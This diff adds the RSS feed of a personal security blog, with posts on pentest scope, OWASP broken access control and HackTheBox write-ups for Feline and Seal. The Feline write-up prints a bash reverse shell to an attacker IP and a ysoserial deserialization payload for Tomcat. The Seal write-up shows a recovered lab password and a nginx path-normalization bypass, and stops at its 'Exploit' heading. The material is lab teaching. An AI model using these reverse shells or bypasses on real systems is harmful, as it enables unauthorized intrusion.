@@ -1,0 +1,355 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Dennis Blog</title>
+    <description>A Jekyll Blog Theme For Hackers</description>
+    <link>http://localhost:4000</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
+    <author>
+      <name>Dennis</name>
+      <email>d.feldbusch@web.de</email>
+      <uri>https://www.github.com/DennisFeldbusch</uri>
+    </author>
+    
+      <item>
+        <title>The scope of a penetration test</title>
+        <description>&lt;h2 id=&quot;different-types-of-penetration-testing&quot;&gt;different types of penetration testing&lt;/h2&gt;
+
+&lt;p&gt;There are three types of pentests which define the initial knowledge of the attacker. White-Box, Gray-Box, Black-Box. This has consequences for the duration, costs and the finding depth of the vulnerabilities.&lt;/p&gt;
+
+&lt;h2 id=&quot;black-box-test&quot;&gt;Black-Box test&lt;/h2&gt;
+
+&lt;p&gt;In a black-box test the attacker has no knowledge about the system at all. Because of that it represents the most realistic test. The drawback of this method is that it requires the most time because the attacker has to get all the information by himself. Furthermore it is likely that a lot of vulnerabilities will be overlooked. Even though it is the most realistic method it is not really comparable with a real scenario because a real attacker has no timelimits but the pentester has.&lt;/p&gt;
+
+&lt;h2 id=&quot;white-box-test&quot;&gt;White-Box test&lt;/h2&gt;
+
+&lt;p&gt;The opposite of the black-box test is the white-box test. Here are a lot if not all information about a system provided. This includes documentation, source code, credentials and much more. This circumvents that the attacker has to invest valuable time to look for those information. However, it is the most unrealistic scenario to execute a penetration test.&lt;/p&gt;
+
+&lt;h2 id=&quot;gray-box-test&quot;&gt;Gray-Box test&lt;/h2&gt;
+
+&lt;p&gt;The hybrid model of the black-box and the white-box test is the gray-box test. There are some information like lower-level credentials or the architecture of the system provided. This saves time for looking for these low hanging information. Furthermore it represents an attack where the attacker already gathered some information about the system.&lt;/p&gt;
+
+&lt;h2 id=&quot;which-one-to-chose&quot;&gt;which one to chose?&lt;/h2&gt;
+
+&lt;p&gt;To answer the question which type fits better you have to consider the goals and limits of the pentest. When it is a pentest on a more secure or previously tested system it could make sense to treat it as a white-box test to go more into detail. A black-box or gray-box test on the other hand could make sense if it is the first or one of the first tests on this system. In conclusion you can say that there is no one-fits-all solution and you have to look at all scenarios seperately.&lt;/p&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+
+&lt;p&gt;&lt;a class=&quot;citation&quot; href=&quot;/references#pentestieee&quot;&gt;(Shebli &amp;amp; Beheshti, 2018)&lt;/a&gt;
+&lt;a class=&quot;citation&quot; href=&quot;/references#pentestwebieee&quot;&gt;(Antunes &amp;amp; Vieira, 2014)&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 13 Sep 2022 00:00:00 +0200</pubDate>
+        <link>http://localhost:4000//Penetration-Testing-Scope</link>
+        <link href="http://localhost:4000/Penetration-Testing-Scope"/>
+        <guid isPermaLink="true">http://localhost:4000/Penetration-Testing-Scope</guid>
+      </item>
+    
+      <item>
+        <title>OWASP Broken Access Control</title>
+        <description>&lt;h2 id=&quot;importance&quot;&gt;importance&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;A01:2021-Broken Access Control moves up from the fifth position; 94% of applications were tested for some form of broken access control. The 34 Common Weakness Enumerations (CWEs) mapped to Broken Access Control had more occurrences in applications than any other category.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;description&quot;&gt;description&lt;/h2&gt;
+
+&lt;p&gt;Access control should ensure that users can only act in thier intended scope. If this access control is broken a user can operate outside the box. 
+These broken access controls can comprise:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;absence of role/access management where every user can act in every scope&lt;/li&gt;
+  &lt;li&gt;bypassing access control checks by modifiying the URL, HTML page, API requests&lt;/li&gt;
+  &lt;li&gt;insecure direct object reference (IDOR)&lt;/li&gt;
+  &lt;li&gt;absence of HTTP method checks (POST, PUT, DELETE)&lt;/li&gt;
+  &lt;li&gt;acting as a user without being logged in or acting as admin when loggen in as user&lt;/li&gt;
+  &lt;li&gt;replaying or tampering metadata i.e. JWT, cookie, hidden field&lt;/li&gt;
+  &lt;li&gt;cross-origin resource sharing (CORS) misconfiguration allows access from unauthorized/untrusted origins&lt;/li&gt;
+  &lt;li&gt;browsing to authenticated pages as unauthenticated user&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;how-to-find&quot;&gt;how to find&lt;/h2&gt;
+
+&lt;p&gt;Using the burp suite extension &lt;a href=&quot;https://github.com/PortSwigger/autorize&quot;&gt;autorize&lt;/a&gt;. Therefore a higher and lower user is needed. 
+Goal of this test is to try if a lower privileged user can access funcions only intended for higher privileged users.
+Take the session cookie and write it in the cookie field in the autorize tab. Start autorize and browse with the higher privileged user.
+Watch the output provided in the autorize tab. This will send the request with the cookie of the higher privileged user and the lower privileged user and compares the response lenth of the original, the modified and the case where no cookie is provided. When the original and the modified lengths are identical it indicates that the lower privileged user can use the same function like the higher privileged user which is an indication for a broken access control.&lt;/p&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;references&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://owasp.org/Top10/A01_2021-Broken_Access_Control/&quot;&gt;1&lt;/a&gt;
+&lt;a href=&quot;https://www.packetlabs.net/posts/broken-access-control/&quot;&gt;2&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 07 Sep 2022 00:00:00 +0200</pubDate>
+        <link>http://localhost:4000//OWASP-2021-01-Broken-Access-Control</link>
+        <link href="http://localhost:4000/OWASP-2021-01-Broken-Access-Control"/>
+        <guid isPermaLink="true">http://localhost:4000/OWASP-2021-01-Broken-Access-Control</guid>
+      </item>
+    
+      <item>
+        <title>Feline HackTheBox</title>
+        <description>&lt;h2 id=&quot;nmap-scan&quot;&gt;nmap scan&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# nmap -sC -sV -Ao nmap 10.10.10.205&lt;/span&gt;
+
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-09-06 12:28 CEST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.205
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.029s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 998 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;conn-refused&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey:
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+8080/tcp open  http    Apache Tomcat 9.0.27
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: VirusBucket
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;65.87 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;open-port&quot;&gt;open port&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;port 22 as ssh as usual&lt;/li&gt;
+  &lt;li&gt;port 8080 with a running tomat instance at version 9.0.27&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;tomcat-9027&quot;&gt;tomcat 9.0.27&lt;/h2&gt;
+
+&lt;p&gt;A little bit of looking around reveals that the running version of tomcat seems to be vulnerable to a rce exploit. &lt;a href=&quot;https://github.com/PenTestical/CVE-2020-9484&quot;&gt;1&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;file-upload&quot;&gt;file upload&lt;/h2&gt;
+
+&lt;p&gt;Looking around and playing around reveals a file upload service at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.205:8080/service/&lt;/code&gt;. It gets an email address and a file. The service says it checks the file for malicious content and sends a report to the email address. 
+Playing around with burpsuite reveals that the service tries to store those files under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/samples/uploads&lt;/code&gt; and uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apache/commons/fileupload&lt;/code&gt; to do that.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/BurpSuite-FileUpload.png&quot; alt=&quot;BurpSuite FileUpload&quot; title=&quot;BurpSuite FileUpload&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;combining&quot;&gt;combining&lt;/h2&gt;
+
+&lt;p&gt;Combining the RCE exploit with the findings of the file upload we can create a reverse shell with &lt;a href=&quot;https://github.com/frohoff/ysoserial&quot;&gt;ysoserial&lt;/a&gt;, upload it and call it with path traversal of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SESSIONID&lt;/code&gt; field in the request.&lt;/p&gt;
+
+&lt;h2 id=&quot;exploiting-user&quot;&gt;exploiting user&lt;/h2&gt;
+
+&lt;p&gt;Starting with the reverse shell file we start up with ysoserial to create the payload. Because we don’t know the Verison of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apache/commons/fileupload&lt;/code&gt; we have to try serveral &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CommonsCollectionsX&lt;/code&gt; provided by ysoserial. As reverse shell we’re using a bash shell which we base64 encode.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;base64 of bash revese shell
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# echo &apos;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.18/4242 0&amp;gt;&amp;amp;1&apos; | base64&lt;/span&gt;
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC80MjQyIDA+JjEK
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;create reverse shell with ysoserial
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java &lt;span class=&quot;nt&quot;&gt;-jar&lt;/span&gt; ysoserial-master.jar CommonsCollections2 &lt;span class=&quot;s2&quot;&gt;&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC80MjQyIDA+JjEK}|{base64,-d}|{bash,-i}&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell.session
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;We take that file and upload it using the intended way. Thereupon we request any site on the tomat site and manipulate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SESSIONID&lt;/code&gt; using burpsuite. The value is equivalent to the previous found directory where the files are uploaded to + the file name of the created reverse shell subtracted by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.session&lt;/code&gt; file-extrension. This is because tomcat automatically appends &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.session&lt;/code&gt; to the requested &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SESSIONID&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/BurpSuite-SessionID.png&quot; alt=&quot;BurpSuite SESSIONID&quot; title=&quot;BurpSuite SESSIONID manipulation&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Start a listener on the local maschine and forward the manipulated request. Voila! User level of Fiola.&lt;/p&gt;
+
+&lt;h2 id=&quot;root-exploitation&quot;&gt;root exploitation&lt;/h2&gt;
+
+</description>
+        <pubDate>Tue, 06 Sep 2022 00:00:00 +0200</pubDate>
+        <link>http://localhost:4000//Feline</link>
+        <link href="http://localhost:4000/Feline"/>
+        <guid isPermaLink="true">http://localhost:4000/Feline</guid>
+      </item>
+    
+      <item>
+        <title>Seal HackTheBox</title>
+        <description>&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Ao&lt;/span&gt; nmap 10.10.10.250
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-09-02 08:33 CEST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.250
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.023s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 997 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;conn-refused&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey:
+|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+443/tcp  open  ssl/http   nginx 1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Seal Market
+| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;seal.htb/organizationName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Seal Pvt Ltd/stateOrProvinceName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;London/countryName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;UK
+| Not valid before: 2021-05-05T10:24:03
+|_Not valid after:  2022-05-05T10:24:03
+| tls-nextprotoneg:
+|_  http/1.1
+|_http-server-header: nginx/1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| tls-alpn:
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent &lt;span class=&quot;nb&quot;&gt;time
+&lt;/span&gt;8080/tcp open  http-proxy
+| fingerprint-strings:
+|   FourOhFourRequest:
+|     HTTP/1.1 401 Unauthorized
+|     Date: Fri, 02 Sep 2022 06:32:57 GMT
+|     Set-Cookie: &lt;span class=&quot;nv&quot;&gt;JSESSIONID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;node01j0kvq70qbpqj11e6pkvdnh6s32.node0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; HttpOnly
+|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
+|     Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;utf-8
+|     Content-Length: 0
+|   GetRequest:
+|     HTTP/1.1 401 Unauthorized
+|     Date: Fri, 02 Sep 2022 06:32:56 GMT
+|     Set-Cookie: &lt;span class=&quot;nv&quot;&gt;JSESSIONID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;node05fxtqecve3hh15vos2gljmegx0.node0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; HttpOnly
+|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
+|     Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;utf-8
+|     Content-Length: 0
+|   HTTPOptions:
+|     HTTP/1.1 200 OK
+|     Date: Fri, 02 Sep 2022 06:32:57 GMT
+|     Set-Cookie: &lt;span class=&quot;nv&quot;&gt;JSESSIONID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;node0sh26ekxv2537kx25ph8zd1m1.node0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; HttpOnly
+|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
+|     Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;utf-8
+|     Allow: GET,HEAD,POST,OPTIONS
+|     Content-Length: 0
+|   RPCCheck:
+|     HTTP/1.1 400 Illegal character &lt;span class=&quot;nv&quot;&gt;OTEXT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x80
+|     Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;iso-8859-1
+|     Content-Length: 71
+|     Connection: close
+|     &amp;lt;h1&amp;gt;Bad Message 400&amp;lt;/h1&amp;gt;&amp;lt;pre&amp;gt;reason: Illegal character &lt;span class=&quot;nv&quot;&gt;OTEXT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x80&amp;lt;/pre&amp;gt;
+|   RTSPRequest:
+|     HTTP/1.1 505 Unknown Version
+|     Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;iso-8859-1
+|     Content-Length: 58
+|     Connection: close
+|     &amp;lt;h1&amp;gt;Bad Message 505&amp;lt;/h1&amp;gt;&amp;lt;pre&amp;gt;reason: Unknown Version&amp;lt;/pre&amp;gt;
+|   Socks4:
+|     HTTP/1.1 400 Illegal character &lt;span class=&quot;nv&quot;&gt;CNTL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x4
+|     Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|     &amp;lt;h1&amp;gt;Bad Message 400&amp;lt;/h1&amp;gt;&amp;lt;pre&amp;gt;reason: Illegal character &lt;span class=&quot;nv&quot;&gt;CNTL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x4&amp;lt;/pre&amp;gt;
+|   Socks5:
+|     HTTP/1.1 400 Illegal character &lt;span class=&quot;nv&quot;&gt;CNTL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x5
+|     Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|_    &amp;lt;h1&amp;gt;Bad Message 400&amp;lt;/h1&amp;gt;&amp;lt;pre&amp;gt;reason: Illegal character &lt;span class=&quot;nv&quot;&gt;CNTL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x5&amp;lt;/pre&amp;gt;
+|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have a title (text/html;charset=utf-8).
+| http-auth:
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Server returned status 401 but no WWW-Authenticate header.
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8080-TCP:V=7.92%I=7%D=9/2%Time=6311A3A4%P=x86_64-pc-linux-gnu%r(Get
+SF:Request,F4,&quot;HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Fri,\x2002\x20
+SF:Sep\x202022\x2006:32:56\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node05fxtqe
+SF:cve3hh15vos2gljmegx0\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,
+SF:\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/html;
+SF:charset=utf-8\r\nContent-Length:\x200\r\n\r\n&quot;)%r(HTTPOptions,106,&quot;HTTP
+SF:/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2002\x20Sep\x202022\x2006:32:57\x2
+SF:0GMT\r\nSet-Cookie:\x20JSESSIONID=node0sh26ekxv2537kx25ph8zd1m1\.node0;
+SF:\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:
+SF:00:00\x20GMT\r\nContent-Type:\x20text/html;charset=utf-8\r\nAllow:\x20G
+SF:ET,HEAD,POST,OPTIONS\r\nContent-Length:\x200\r\n\r\n&quot;)%r(RTSPRequest,AD
+SF:,&quot;HTTP/1\.1\x20505\x20Unknown\x20Version\r\nContent-Type:\x20text/html;
+SF:charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n
+SF:\r\n&amp;lt;h1&amp;gt;Bad\x20Message\x20505&amp;lt;/h1&amp;gt;&amp;lt;pre&amp;gt;reason:\x20Unknown\x20Version&amp;lt;/p
+SF:re&amp;gt;&quot;)%r(FourOhFourRequest,F5,&quot;HTTP/1\.1\x20401\x20Unauthorized\r\nDate:
+SF:\x20Fri,\x2002\x20Sep\x202022\x2006:32:57\x20GMT\r\nSet-Cookie:\x20JSES
+SF:SIONID=node01j0kvq70qbpqj11e6pkvdnh6s32\.node0;\x20Path=/;\x20HttpOnly\
+SF:r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-
+SF:Type:\x20text/html;charset=utf-8\r\nContent-Length:\x200\r\n\r\n&quot;)%r(So
+SF:cks5,C3,&quot;HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x5\r\nConten
+SF:t-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nCon
+SF:nection:\x20close\r\n\r\n&amp;lt;h1&amp;gt;Bad\x20Message\x20400&amp;lt;/h1&amp;gt;&amp;lt;pre&amp;gt;reason:\x20
+SF:Illegal\x20character\x20CNTL=0x5&amp;lt;/pre&amp;gt;&quot;)%r(Socks4,C3,&quot;HTTP/1\.1\x20400\
+SF:x20Illegal\x20character\x20CNTL=0x4\r\nContent-Type:\x20text/html;chars
+SF:et=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n&amp;lt;
+SF:h1&amp;gt;Bad\x20Message\x20400&amp;lt;/h1&amp;gt;&amp;lt;pre&amp;gt;reason:\x20Illegal\x20character\x20CN
+SF:TL=0x4&amp;lt;/pre&amp;gt;&quot;)%r(RPCCheck,C7,&quot;HTTP/1\.1\x20400\x20Illegal\x20character\
+SF:x20OTEXT=0x80\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nConte
+SF:nt-Length:\x2071\r\nConnection:\x20close\r\n\r\n&amp;lt;h1&amp;gt;Bad\x20Message\x204
+SF:00&amp;lt;/h1&amp;gt;&amp;lt;pre&amp;gt;reason:\x20Illegal\x20character\x20OTEXT=0x80&amp;lt;/pre&amp;gt;&quot;);
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.32 seconds
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;interpretation&quot;&gt;Interpretation&lt;/h2&gt;
+
+&lt;p&gt;There are three open ports: 22, 443 and 8080.&lt;/p&gt;
+
+&lt;h2 id=&quot;port-443&quot;&gt;Port 443&lt;/h2&gt;
+
+&lt;p&gt;The website on port 433 seems to be not vulnerable. 
+There are two input possibilities but basic xss, sqli testing reveals nothing interesting.&lt;/p&gt;
+
+&lt;h2 id=&quot;port-8080&quot;&gt;Port 8080&lt;/h2&gt;
+
+&lt;p&gt;The application on port 8080 is GitBucket. Basic or default credentials are not wirking to login so creating a new account seems to be the way to go. We have access to two repositories. In the tomcat folder in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tomcat-users.xml&lt;/code&gt; there is no user entry but the git history reveals a deleted tomcat user with the credentials: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tomcat:42MrHBf*z8{Z%&lt;/code&gt;. This password can be reused for the GitBucket service as user luis but this had no further impact. More looking around reveals that there is a nginx reverse proxy running which blocks requests to for example &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/manager/html&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;path-traversal&quot;&gt;Path traversal&lt;/h2&gt;
+
+&lt;p&gt;This combination of tomcat and nginx is most often vulnerable to a path traversal attack as explained &lt;a href=&quot;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&quot;&gt;here&lt;/a&gt;. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.250/manager;name=dennis/html/&lt;/code&gt; did the trick because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/manager;name=dennis/html&lt;/code&gt; doesn’t match the pattern &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/manager/html&lt;/code&gt; checked by nginx so it forwards the request to the tomcat. The application server normalizes the reqest and throws the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;name=dennis&lt;/code&gt;-part away so tomcat sees only &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/manager/html&lt;/code&gt;. For the managersite the previous found credentials are working so we have access to the admin panel.&lt;/p&gt;
+
+&lt;h2 id=&quot;exploit&quot;&gt;Exploit&lt;/h2&gt;
+
+&lt;p&gt;Creating an exploit which we can upload to the tomcat.&lt;/p&gt;
+
